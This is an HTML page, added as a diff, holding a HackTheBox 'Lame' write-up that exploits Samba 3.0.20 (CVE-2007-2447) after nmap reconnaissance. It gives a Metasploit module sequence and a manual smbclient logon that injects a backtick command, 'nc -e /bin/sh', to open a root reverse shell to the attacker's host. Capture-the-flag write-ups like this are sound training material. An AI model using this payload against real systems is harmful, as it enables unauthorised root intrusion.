@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>lame.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index-en.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Back
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../../pt-br/writeups/hackthebox/machines/lame.html" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../../en-us/writeups/hackthebox/machines/lame.html" class="active" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Lame</h1>
+         <p class="meta">
+            HackTheBox &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Lame is an old Linux box that falls in one step: <b>Samba 3.0.20</b> hands the username to the shell unsanitized when the <i>username map script</i> option is enabled (<b>CVE-2007-2447</b>), and the command runs as <b>root</b>.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Attack path</figcaption>
+            <svg viewBox="0 0 660 84" role="img" aria-label="Attack path" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconnaissance</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Exploitation - CVE-2007-2447</tspan></text></svg>
+         </figure>
+
+         <h2>Reconnaissance</h2>
+
+         <p>Nmap shows FTP, SSH, SMB (139/445) and distccd on 3632. The version scan identifies <b>vsftpd 2.3.4</b> and <b>Samba 3.0.20-Debian</b>.</p>
+
+         <pre class="code-block"><code>nmap -Pn -n -sT --min-rate 1500 -p- &lt;IP&gt;
+nmap -Pn -n -sT -sV -sC -p21,22,139,445,3632 &lt;IP&gt;
+# 21 vsftpd 2.3.4, 22 OpenSSH 4.7p1, 139/445 Samba 3.0.20-Debian, 3632 distccd</code></pre>
+
+         <p>vsftpd 2.3.4 is famous for the <code>:)</code> username backdoor, but the firewall blocks port 6200, which it would open. The way in is Samba.</p>
+
+         <h2>Exploitation - CVE-2007-2447</h2>
+
+         <p>A username like <code>/=`command`</code> makes Samba run the command before authentication even happens. Since <i>smbd</i> runs as root, the shell arrives with full privileges.</p>
+
+         <pre class="code-block"><code>msfconsole -q
+use exploit/multi/samba/usermap_script
+set RHOSTS &lt;IP&gt;
+set LHOST tun0
+run</code></pre>
+
+         <p>Without Metasploit, the same payload goes in <i>smbclient</i>'s logon, against the <i>tmp</i> share, which accepts anonymous sessions.</p>
+
+         <pre class="code-block"><code>nc -lvnp 4444
+smbclient //&lt;IP&gt;/tmp -N -c &#x27;logon &quot;/=`nohup nc -e /bin/sh &lt;MY_IP&gt; 4444`&quot;&#x27;
+id
+cat /home/makis/user.txt /root/root.txt</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
